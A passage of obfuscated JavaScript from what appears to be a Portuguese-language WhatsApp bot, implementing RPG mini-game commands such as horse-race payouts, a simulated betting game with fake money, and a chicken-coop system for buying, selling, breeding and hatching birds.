                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    if (Number(cavalosrpg[AC].countDc) > 0) {
                      L2 = 1;
                    } else {
                      L2 = 0;
                    }
                    if (Number(cavalosrpg[AC].cavalos[DCV].dercav) > 0) {
                      LC2 = 1;
                    } else {
                      LC2 = 0;
                    }
                    LM = cavalosrpg[AC].corridaL;
                    CV = cavalosrpg[AC].countVc;
                    CCD = cavalosrpg[AC].countDc;
                    CVC = cavalosrpg[AC].capitalVc;
                    CVCS = cavalosrpg[AC].cavalos[DCV].viccav;
                    CDCS = cavalosrpg[AC].cavalos[DCV].dercav;
                    DTCS = cavalosrpg[AC].cavalos[DCV].contdin;
                    DVCS = cavalosrpg[AC].cavalos[DCV].lucdin;
                    cavalosrpg[AC].corridaL = Number(LM) - 1;
                    cavalosrpg[AC].countVc = Number(CV) + 1;
                    cavalosrpg[AC].countDc = Number(CCD) - Number(L2);
                    cavalosrpg[AC].capitalVc = Number(CVC) + Number(cav2);
                    cavalosrpg[AC].cavalos[DCV].viccav = Number(CVCS) + 1;
                    cavalosrpg[AC].cavalos[DCV].dercav = Number(CDCS) - Number(LC2);
                    cavalosrpg[AC].cavalos[DCV].contdin = Number(DTCS) + Number(_0x40e45c[0]);
                    cavalosrpg[AC].cavalos[DCV].lucdin = Number(DVCS) + Number(cav2);
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                    _0x403602("🐎 A corrida terminou, e seu cavalo chegou em " + _0x2bb232 + "º lugar... Você ganhou R$ " + Number(cav2).toFixed(2));
                  }
                  ;
                  if (Number(_0x2bb232) === 3) {
                    DCV = cavalosrpg[AC].cavalos.map(_0x2aa8a1 => _0x2aa8a1.nomedocavalo).indexOf(cavalosrpg[AC].setcav);
                    cav2 = Number(_0x40e45c[0]) / 2;
                    MC = sabrpg[_0x3529b0].money;
                    sabrpg[_0x3529b0].money = Number(MC) + Number(cav2);
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    if (Number(cavalosrpg[AC].countDc) > 0) {
                      L3 = 1;
                    } else {
                      L3 = 0;
                    }
                    if (Number(cavalosrpg[AC].cavalos[DCV].dercav) > 0) {
                      LC3 = 1;
                    } else {
                      LC3 = 0;
                    }
                    LM = cavalosrpg[AC].corridaL;
                    CV = cavalosrpg[AC].countVc;
                    CCD = cavalosrpg[AC].countDc;
                    CVC = cavalosrpg[AC].capitalVc;
                    CVCS = cavalosrpg[AC].cavalos[DCV].viccav;
                    CDCS = cavalosrpg[AC].cavalos[DCV].dercav;
                    DTCS = cavalosrpg[AC].cavalos[DCV].contdin;
                    DVCS = cavalosrpg[AC].cavalos[DCV].lucdin;
                    cavalosrpg[AC].corridaL = Number(LM) - 1;
                    cavalosrpg[AC].countVc = Number(CV) + 1;
                    cavalosrpg[AC].countDc = Number(CCD) - Number(L3);
                    cavalosrpg[AC].capitalVc = Number(CVC) + Number(cav2);
                    cavalosrpg[AC].cavalos[DCV].viccav = Number(CVCS) + 1;
                    cavalosrpg[AC].cavalos[DCV].dercav = Number(CDCS) - Number(LC3);
                    cavalosrpg[AC].cavalos[DCV].contdin = Number(DTCS) + Number(_0x40e45c[0]);
                    cavalosrpg[AC].cavalos[DCV].lucdin = Number(DVCS) + Number(cav2);
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                    _0x403602("🐎 A corrida terminou, e seu cavalo chegou em " + _0x2bb232 + "º lugar... Você ganhou R$ " + Number(cav2).toFixed(2));
                  }
                  ;
                  if (Number(_0x2bb232) > 3) {
                    DCV = cavalosrpg[AC].cavalos.map(_0x5bf9c6 => _0x5bf9c6.nomedocavalo).indexOf(cavalosrpg[AC].setcav);
                    MC = sabrpg[_0x3529b0].money;
                    sabrpg[_0x3529b0].money = Number(MC) - Number(_0x40e45c[0]);
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    LM = cavalosrpg[AC].corridaL;
                    CCD = cavalosrpg[AC].countDc;
                    CDC = cavalosrpg[AC].capitalDc;
                    CDCS = cavalosrpg[AC].cavalos[DCV].dercav;
                    DTCS = cavalosrpg[AC].cavalos[DCV].contdin;
                    cavalosrpg[AC].corridaL = Number(LM) - 1;
                    cavalosrpg[AC].countDc = Number(CCD) + 1;
                    cavalosrpg[AC].capitalDc = Number(CDC) + Number(_0x40e45c[0]);
                    cavalosrpg[AC].cavalos[DCV].dercav = Number(CDCS) + 1;
                    cavalosrpg[AC].cavalos[DCV].contdin = Number(DTCS) + Number(_0x40e45c[0]);
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/cavalosrpg.json", JSON.stringify(cavalosrpg));
                    _0x403602("🐎 A corrida terminou, e seu cavalo chegou em " + _0x2bb232 + "º lugar... Você perdeu R$ " + Number(_0x40e45c[0]).toFixed(2));
                  }
                }
              }
              break;
            case "1xbcbet":
            case "1xbcbets":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!_0x1d6557) {
                return _0x403602("🛒 *Bot City Bets* é o novo sistema de apostas... Invista uma quantia entre R$ 100.00 e R$ 10000.00, e veja seu dinheiro rodar.");
              }
              if (!Number(_0x40e45c[0])) {
                return _0x403602(_0x40e45c[0] + " não é número... 😿");
              }
              _0x3529b0 = sabrpg.map(_0x1648df => _0x1648df.id).indexOf(_0x32e455);
              minuto3 = moment.tz("America/Sao_Paulo").format("mm");
              if (Number(_0x40e45c[0]) > Number(sabrpg[_0x3529b0].money)) {
                return _0x403602("Você não possui dinheiro suficiente para investir");
              }
              if (Number(_0x40e45c[0]) < 100) {
                return _0x403602("Você deve investir no mínimo R$ 100.00");
              }
              if (Number(_0x40e45c[0]) > 10000) {
                return _0x403602("Nossa plataforma não paga mais que R$ 10000.00");
              }
              if (!JSON.stringify(bcbet).includes(_0x32e455)) {
                const _0x1ea0ad = {
                  id: _0x32e455,
                  minuto: minuto3
                };
                bcbet.push(_0x1ea0ad);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/1xbcbet.json", JSON.stringify(bcbet));
              }
              AC = bcbet.map(_0x3ec775 => _0x3ec775.id).indexOf(_0x32e455);
              if (Number(bcbet[AC].minuto) !== Number(minuto3)) {
                bcbet[AC].minuto = minuto3;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                MN = Math.floor(Math.random() * 100);
                _0x403602("📊 Analisando os gráficos...");
                if (Number(MN) > 15) {
                  PG = ["na construção de um estádio de futebol, mas a construção desabou...", "na bolsa de valores, mas a Bovespa caiu drasticamente...", "num leilão de carros, mas os carros não foram leiloados...", "num leilão de carros, mas você sofreu um golpe...", "no seu time de futebol, mas o seu time perdeu o jogo...", "numa corrida, mas o carro bateu...", "em uma luta de UFC, e seu lutador sofreu um nocaute..."];
                  txt = II + "xbc Bet" + II + " > A sua casa de apostas online!\n—\n[🔴] - As estatísticas não são muito favoráveis! Você investiu " + PG[Math.floor(Math.random() * PG.length)] + "\n• Você perdeu, então sofreu uma perda de *R$ " + Number(_0x40e45c[0]).toFixed(2) + "* em dinheiro.";
                  img = "https://telegra.ph/file/747133ed87f267ca8d35f.jpg";
                  MD = sabrpg[_0x3529b0].money;
                  sabrpg[_0x3529b0].money = Number(MD) - Number(_0x40e45c[0]);
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                } else {
                  GG = ["na construção de um estádio de futebol, e a construção foi bem sucedida...", "na bolsa de valores, e a Bovespa subiu exponencialmente...", "num leilão de carros, e obteve grande lucro na venda dos mesmos...", "no seu time de futebol, e o seu time venceu o jogo...", "numa corrida, e o seu carro chegou em primeiro lugar...", "em uma luta de UFC, e seu lutador derrubou o oponente facilmente..."];
                  VL1 = Math.floor(Math.random() * 9) + 1;
                  VL2 = Number(_0x40e45c[0]) * Number(VL1);
                  txt = II + "xbc Bet" + II + " > A sua casa de apostas online!\n—\n[🟢] - As estatísticas são positivas e muito boas por sinal! Você investiu " + GG[Math.floor(Math.random() * GG.length)] + "\n• Você ganhou e recebeu como saldo: *R$ " + Number(VL2).toFixed(2) + "*";
                  img = "https://telegra.ph/file/f600b52a9963c58900e5b.jpg";
                  MD = sabrpg[_0x3529b0].money;
                  sabrpg[_0x3529b0].money = Number(MD) + Number(VL2);
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                }
                setTimeout(() => {
                  const _0x4b769e = {
                    url: img
                  };
                  const _0x1aa1c6 = {
                    image: _0x4b769e,
                    caption: txt
                  };
                  const _0x41c890 = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x1aa1c6, _0x41c890);
                }, 2000);
              } else {
                _0x403602("Aguarde *" + (60 - Number(moment.tz("America/Sao_Paulo").format("ss"))) + " seg.* para fazer novas apostas novamente.");
              }
              break;
            case "resetbotbet":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              for (_0xc3d45a = 0; _0xc3d45a < sabrpg.length; _0xc3d45a++) {
                sabrpg[_0xc3d45a].bcbet = true;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              }
              _0x403602("Gráficos restaurados para todos os " + sabrpg.length + " usuários do RPG");
              break;
            case "comprargalinheiro":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (JSON.stringify(galosrpg).includes(_0x32e455)) {
                return _0x403602("Você já possui um galinheiro... Consulte a " + _0x1d93be + "lojadegalos para comprar galos e brigar com eles 🐔");
              }
              _0x3529b0 = sabrpg.map(_0x5424fe => _0x5424fe.id).indexOf(_0x32e455);
              if (Number(sabrpg[_0x3529b0].money) < 500) {
                return _0x403602("Vc não possui dinheiro suficiente para efetuar essa compra...");
              }
              gaH = moment.tz("America/Sao_Paulo").format("HH");
              gaD = moment.tz("America/Sao_Paulo").format("DD");
              gaM = moment.tz("America/Sao_Paulo").format("MM");
              const _0x1e63c5 = {
                id: _0x32e455,
                level: 1,
                galinhas: 0,
                durabilidade: 5,
                ovos: 0,
                countVg: 0,
                countDg: 0,
                dinVg: 0,
                luckVg: 0,
                brigaL: 15,
                brigaH: gaH,
                brigaD: gaD,
                brigaM: gaM,
                galos: []
              };
              galosrpg.push(_0x1e63c5);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
              MC = sabrpg[_0x3529b0].money;
              sabrpg[_0x3529b0].money = Number(MC) - 500;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("🐔 Galinheiro comprado com sucesso... Consulte " + _0x1d93be + "galinheiro");
              break;
            case "comprargalo":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(galosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um galinheiro antes...");
              }
              if (!_0x1d6557) {
                return _0x403602("Defina a quantidade de galos que deseja comprar...");
              }
              if (!Number(_0x40e45c[0])) {
                return _0x403602(_0x40e45c[0] + " não é número...");
              }
              _0x3529b0 = sabrpg.map(_0x57bccb => _0x57bccb.id).indexOf(_0x32e455);
              AD = galosrpg.map(_0x44e583 => _0x44e583.id).indexOf(_0x32e455);
              if (Number(_0x40e45c[0]) === 1 || Number(_0x40e45c[0]) === 6 || Number(_0x40e45c[0]) === 12) {
                if (Number(Number(galosrpg[AD].galos.length) + Number(_0x40e45c[0])) > Number(Number(galosrpg[AD].level) * 5)) {
                  return _0x403602("Não é possível comprar +" + _0x40e45c[0] + " " + (Number(_0x40e45c[0]) < 2 ? "galo" : "galos") + ", pois excede o limite de " + Number(galosrpg[AD].level) * 5 + " galos...\n• Caso queira aumentar o tamanho do galinheiro, use " + _0x1d93be + "upgalo");
                }
                if (Number(_0x40e45c[0]) === 1) {
                  if (Number(sabrpg[_0x3529b0].money) < 100) {
                    return _0x403602("Vc não possui saldo suficiente para efetuar essa compra!");
                  }
                  galosrpg[AD].galos.push({
                    vida: 4,
                    vigalo: 0,
                    degalo: 0
                  });
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                  MD = sabrpg[_0x3529b0].money;
                  sabrpg[_0x3529b0].money = Number(MD) - 100;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                  _0x403602("1 galo comprado com sucesso!");
                }
                if (Number(_0x40e45c[0]) === 6) {
                  if (Number(sabrpg[_0x3529b0].money) < 550) {
                    return _0x403602("Vc não possui saldo suficiente para efetuar essa compra...");
                  }
                  for (_0xc3d45a = 0; _0xc3d45a < 6; _0xc3d45a++) {
                    galosrpg[AD].galos.push({
                      vida: 4,
                      vigalo: 0,
                      degalo: 0
                    });
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                  }
                  MD = sabrpg[_0x3529b0].money;
                  sabrpg[_0x3529b0].money = Number(MD) - 550;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                  _0x403602("6 galos comprado com sucesso.");
                }
                if (Number(_0x40e45c[0]) === 12) {
                  if (Number(sabrpg[_0x3529b0].money) < 1000) {
                    return _0x403602("Vc não possui saldo suficiente para efetuar essa compra...");
                  }
                  for (_0xc3d45a = 0; _0xc3d45a < 12; _0xc3d45a++) {
                    galosrpg[AD].galos.push({
                      vida: 4,
                      vigalo: 0,
                      degalo: 0
                    });
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                  }
                  MD = sabrpg[_0x3529b0].money;
                  sabrpg[_0x3529b0].money = Number(MD) - 1000;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                  _0x403602("12 galos comprado com sucesso");
                }
              } else {
                _0x403602("Não é possível comprar essa quantidade de galos...");
              }
              break;
            case "vendergalo":
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(galosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um galo antes...");
              }
              if (!_0x1d6557) {
                return _0x403602("Defina a quantidade de galos que deseja vender... Ex:\n" + (_0x1d93be + _0x3dec88) + " 3");
              }
              if (!Number(_0x40e45c[0])) {
                return _0x403602(_0x40e45c[0] + " não é número...");
              }
              if (Number(_0x40e45c[0]) < 1) {
                return _0x403602("Não é possível vender menos que um galo...");
              }
              if (_0x1d6557.includes(".")) {
                return _0x403602("Não pode números decimais...");
              }
              _0x3529b0 = sabrpg.map(_0x4a39b7 => _0x4a39b7.id).indexOf(_0x32e455);
              AD = galosrpg.map(_0x5384db => _0x5384db.id).indexOf(_0x32e455);
              if (Number(_0x40e45c[0]) > Number(galosrpg[AD].galos.length)) {
                return _0x403602("Não é possível vender um número maior do que a quantidade de galos em seu galinheiro...");
              }
              if (Number(galosrpg[AD].galos.length) === 0) {
                return _0x403602("Você precisa comprar um galo antes...");
              }
              for (_0xc3d45a = 0; _0xc3d45a < Number(_0x40e45c[0]); _0xc3d45a++) {
                galosrpg[AD].galos.splice(_0xc3d45a, 1);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
              }
              MD = sabrpg[_0x3529b0].money;
              sabrpg[_0x3529b0].money = Number(MD) + Number(Number(_0x40e45c[0]) * 50);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602(_0x40e45c[0] + " galo" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " vendido" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " com sucesso, avaliado" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " em R$ " + Number(Number(_0x40e45c[0]) * 50).toFixed(2));
              break;
            case "comprargalinha":
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(galosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um galinheiro antes...");
              }
              _0x3529b0 = sabrpg.map(_0x52c739 => _0x52c739.id).indexOf(_0x32e455);
              AD = galosrpg.map(_0x92216b => _0x92216b.id).indexOf(_0x32e455);
              if (!_0x1d6557) {
                return _0x403602("Coloque a quantidade de galinhas que deseja comprar...");
              }
              if (!Number(_0x40e45c[0])) {
                return _0x403602(_0x40e45c[0] + " não é número...");
              }
              if (Number(_0x40e45c[0]) < 1) {
                return _0x403602("Não é possível comprar menos que uma galinha...");
              }
              if (_0x1d6557.includes(".")) {
                return _0x403602("Não pode números decimais...");
              }
              if (Number(_0x40e45c[0]) > Number(Number(galosrpg[AD].level) * 2)) {
                return _0x403602("Não é possível comprar +" + _0x40e45c[0] + " galinhas, pois excede o limite de " + Number(galosrpg[AD].level) * 2 + " galinhas em seu galinheiro...\nCaso queira aumentar o tamanho do seu galinheiro, use o comando " + _0x1d93be + "upgalo");
              }
              if (Number(sabrpg[_0x3529b0].money) < Number(Number(_0x40e45c[0]) * 100)) {
                return _0x403602(_0x40e45c[0] + " galinha" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " " + (Number(_0x40e45c[0]) > 1 ? "irão" : "irá") + " custar R$ " + Number(Number(_0x40e45c[0]) * 100).toFixed(2) + ", e este valor excede o saldo monetário em sua conta...");
              }
              GG = galosrpg[AD].galinhas;
              galosrpg[AD].galinhas = Number(GG) + Number(_0x40e45c[0]);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
              MD = sabrpg[_0x3529b0].money;
              sabrpg[_0x3529b0].money = Number(MD) - Number(Number(_0x40e45c[0]) * 100);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602(_0x40e45c[0] + " galinha" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " comprada" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " com sucesso...");
              break;
            case "vendergalinha":
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(galosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar uma galinha antes...");
              }
              if (!_0x1d6557) {
                return _0x403602("Defina a quantidade de galinhas que deseja vender... Ex:\n" + (_0x1d93be + _0x3dec88) + " 3");
              }
              if (!Number(_0x40e45c[0])) {
                return _0x403602(_0x40e45c[0] + " não é número...");
              }
              if (Number(_0x40e45c[0]) < 1) {
                return _0x403602("Não é possível vender menos que uma galinha...");
              }
              if (_0x1d6557.includes(".")) {
                return _0x403602("Não pode números decimais...");
              }
              _0x3529b0 = sabrpg.map(_0x22fa06 => _0x22fa06.id).indexOf(_0x32e455);
              AD = galosrpg.map(_0x5e4df0 => _0x5e4df0.id).indexOf(_0x32e455);
              if (Number(_0x40e45c[0]) > Number(galosrpg[AD].galinhas)) {
                return _0x403602("Não é possível vender um número maior do que a quantidade de galinhas em seu galinheiro...");
              }
              if (Number(galosrpg[AD].galinhas) === 0) {
                return _0x403602("Você precisa comprar uma galinha antes...");
              }
              QG = galosrpg[AD].galinhas;
              galosrpg[AD].galinhas = Number(QG) - Number(_0x40e45c[0]);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
              MD = sabrpg[_0x3529b0].money;
              sabrpg[_0x3529b0].money = Number(MD) + Number(Number(_0x40e45c[0]) * 50);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602(_0x40e45c[0] + " galinha" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " vendida" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " com sucesso, avaliada" + (Number(_0x40e45c[0]) > 1 ? "s" : "") + " em R$ " + Number(Number(_0x40e45c[0]) * 50).toFixed(2));
              break;
            case "cruzargg":
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(galosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um galinheiro antes...");
              }
              AD = galosrpg.map(_0x5eb156 => _0x5eb156.id).indexOf(_0x32e455);
              if (Number(galosrpg[AD].galos.length) === 0) {
                return _0x403602("Você não possui galos...🐓 É necessário ao menos 1 galo para cruzar.");
              }
              if (Number(galosrpg[AD].galinhas) === 0) {
                return _0x403602("Você não possui galinhas...🐔 É necessário ao menos 1 galinha para cruzar.");
              }
              if (Number(galosrpg[AD].ovos) < Number(Number(galosrpg[AD].level * 2))) {
                alecruz = Math.floor(Math.random() * 100);
                if (alecruz > 50) {
                  if (Number(galosrpg[AD].durabilidade) > 1) {
                    QD = galosrpg[AD].durabilidade;
                    galosrpg[AD].durabilidade = Number(QD) - 1;
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                    resp = "Não houve sucesso no cruzamento das aves";
                  } else {
                    QG = galosrpg[AD].galinhas;
                    galosrpg[AD].galinhas = Number(QG) - 1;
                    galosrpg[AD].durabilidade = Number(galosrpg[AD].level);
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                    resp = "Sua galinha não estava pronta para o cruzamento, e acabou morrendo..." + (Number(galosrpg[AD].galinhas) > 0 ? "\nFelizmente, você ainda possui " + galosrpg[AD].galinhas + " galinha" + (Number(galosrpg[AD].galinhas) > 1 ? "s" : "") + " 🐔" : "");
                  }
                } else if (Number(galosrpg[AD].durabilidade) > 1) {
                  QD = galosrpg[AD].durabilidade;
                  QO = galosrpg[AD].ovos;
                  galosrpg[AD].durabilidade = Number(QD) - 1;
                  galosrpg[AD].ovos = Number(QO) + 1;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                  resp = "Sucesso, seu cruzamento gerou 1 ovo...\nUse " + _0x1d93be + "chocarovo para tentar a sorte";
                } else {
                  QG = galosrpg[AD].galinhas;
                  QO = galosrpg[AD].ovos;
                  galosrpg[AD].galinhas = Number(QG) - 1;
                  galosrpg[AD].ovos = Number(QO) + 1;
                  galosrpg[AD].durabilidade = Number(galosrpg[AD].level);
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                  resp = "Sucesso, seu cruzamento gerou 1 ovo, mas a sua galinha morreu no processo..." + (Number(galosrpg[AD].galinhas) > 0 ? "\nFelizmente, você ainda possui " + galosrpg[AD].galinhas + " " + (Number(galosrpg[AD].galinhas) > 1 ? galosrpg[AD].galinhas + " galinhas" : "1 galinha") : "");
                }
                _0x403602("" + resp);
              } else {
                _0x403602("Você atingiu a quantidade máxima de ovos em seu galinheiro... Use " + _0x1d93be + "chocarovo para choca-los");
              }
              break;
            case "chocarovo":
            case "chocar":
            case "ovo":
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(galosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um galinheiro antes...");
              }
              AD = galosrpg.map(_0x418bf8 => _0x418bf8.id).indexOf(_0x32e455);
              if (Number(galosrpg[AD].ovos) <= 0) {
                return _0x403602("Você não possui ovos para chocar...");
              }
              if (Number(galosrpg[AD].galos.length) >= Number(Number(galosrpg[AD].level) * 5)) {
                return _0x403602("Todos os seus slots já estão na quantidade máxima..");
              }
              aleovo = Math.floor(Math.random() * 100);
              if (aleovo > 40) {
                QO = galosrpg[AD].ovos;
                galosrpg[AD].ovos = Number(QO) - 1;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                _0x403602("Sem sucesso ao tentar chocar o ovo!😿");
              } else {
                QO = galosrpg[AD].ovos;
                galosrpg[AD].ovos = Number(QO) - 1;
                galosrpg[AD].galos.push({
                  vida: 4,
                  vigalo: 0,
                  degalo: 0
                });
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                _0x403602("Sucesso, ovo chocado deu origem a +1 galo para o seu galinheiro 😸☝🏽");
              }
              break;
            case "galinheiro":
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              setTimeout(() => {
                _0x1b86ad(_0x4f1071, "🐔");
              }, 300);
              if (!JSON.stringify(galosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um galinheiro antes...");
              }
              _0x3529b0 = sabrpg.map(_0x5e4ac3 => _0x5e4ac3.id).indexOf(_0x32e455);
              AD = galosrpg.map(_0x55319c => _0x55319c.id).indexOf(_0x32e455);
              totalG = galosrpg[AD].galos;
              let _0x5a2eca = 0;
              let _0x1e74f3 = 0;
              let _0x3ba8d6 = 0;
              for (_0xc3d45a = 0; _0xc3d45a < totalG.length; _0xc3d45a++) {
                _0x5a2eca += totalG[_0xc3d45a].vida;
                if (Number(totalG[_0xc3d45a].vigalo) > 0) {
                  _0x1e74f3 += totalG[_0xc3d45a].vigalo;
                }
                if (Number(totalG[_0xc3d45a].degalo) > 0) {
                  _0x3ba8d6 += totalG[_0xc3d45a].degalo;
                }
              }
              if (Number(galosrpg[AD].galos.length) > 0) {
                TT1 = "" + Number(Number("" + _0x5a2eca) / Number(galosrpg[AD].galos.length)).toFixed(0);
                TT2 = Number(Number("" + _0x1e74f3) / Number(Number(galosrpg[AD].galos.length) / 2)).toFixed(0) + "/" + Number(Number(Number("" + _0x1e74f3) + Number("" + _0x3ba8d6)) / Number(Number(galosrpg[AD].galos.length) / 2)).toFixed(0);
                TT3 = Number(Number("" + _0x1e74f3) / Number(Number("" + _0x1e74f3) + Number("" + _0x3ba8d6)) * 100).toFixed(1) + "%";
              } else {
                TT1 = "0";
                TT2 = "0/0";
                TT3 = "0.0%";
              }
